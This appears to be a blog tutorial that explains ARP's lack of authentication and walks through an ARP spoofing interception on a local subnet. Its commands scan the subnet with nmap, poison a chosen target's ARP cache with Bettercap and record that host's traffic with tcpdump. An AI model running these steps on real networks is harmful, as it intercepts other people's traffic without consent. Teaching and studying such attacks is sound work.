---
title: A Narrative Walkthrough of ARP Spoofing
description: How local network trust can be intercepted through ARP spoofing
date: 2026-10-11
status: PUBLISH
tags:
  - linux
  - network
---

Networks operate on trust. When a device wants to talk to another device on the same local network, it relies on the Address Resolution Protocol (ARP) to map IP addresses to physical MAC addresses. ARP has no built-in authentication mechanism. Any device can claim to be any IP address, and the rest of the network will update its tables accordingly.

This walkthrough explores how that trust can be intercepted, turning a standard local connection into a silent observation point.

## Mapping the Terrain

Before any interception can occur, we need to understand the local environment. Every network interface has an assigned scope and gateway. To find the local subnet, inspect the routing table:

```bash
ip route show

```

```bash
default via 10.0.0.1 dev wlp2s0 proto dhcp src 10.0.0.15 metric 600
10.0.0.0/24 dev wlp2s0 proto kernel scope link src 10.0.0.15 metric 600

```

The output identifies `10.0.0.0/24` as the active local subnet and `10.0.0.15` as our own source IP.

Next, we identify the active hosts sharing this space using a ping scan:

```bash
sudo nmap -sn 10.0.0.0/24

```

To confirm our own interface details, hardware address, and network gateway bindings, we check the local interface configuration:

```bash
ip addr

```

```bash
1: wlp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 1c:4d:70:29:10:b7 brd ff:ff:ff:ff:ff:ff
    altname wlx1c4d702910b7
    inet 10.0.0.15/24 brd 10.0.0.255 scope global dynamic noprefixroute wlp2s0
        valid_lft 44534sec preferred_lft 44534sec
    inet6 fe80::3ffe:ecb5:2bf0:3d19/64 scope link noprefixroute 

```

Our MAC address is `1c:4d:70:29:10:b7`, and the target IP is identified as `10.0.0.42`.


## Poisoning the Cache

Once active hosts and targets are mapped, we initiate the spoofing process. ARP spoofing floods the target and the gateway with forged ARP reply packets, telling the target that our MAC address belongs to the gateway IP, and telling the gateway that our MAC address belongs to the target IP.

Using Bettercap on the wireless interface:

```bash
sudo bettercap -iface wlp2s0

```

Inside the interactive session, we discover active hosts, designate the target, and activate the spoofing engine:

```bash
net.probe on
set arp.spoof.targets 10.0.0.42
arp.spoof on

```

### What the Victim Sees

When the ARP poisoning takes effect, the victim's device accepts the fraudulent ARP replies without validation. If the victim runs `arp -a` to inspect their local ARP cache, they will see that the gateway's IP address (`10.0.0.1`) is now mapped to the attacker's MAC address (`1c:4d:70:29:10:b7`) instead of the legitimate router's hardware address.

Traffic intended for the external network now routes directly through our machine.


## Intercepting the Stream

With the traffic passing through our host, we capture the data stream to analyze or store for later inspection. We run `tcpdump` on the interface, filtering specifically for the target host's traffic and writing the raw packets to a capture file:

```bash
sudo tcpdump -i wlp2s0 -n host 10.0.0.42 -w arpspoof.pcap

```

The capture file `arpspoof.pcap` now contains the transit packets originating from or destined for the target, captured silently while the network operates under a false sense of security.
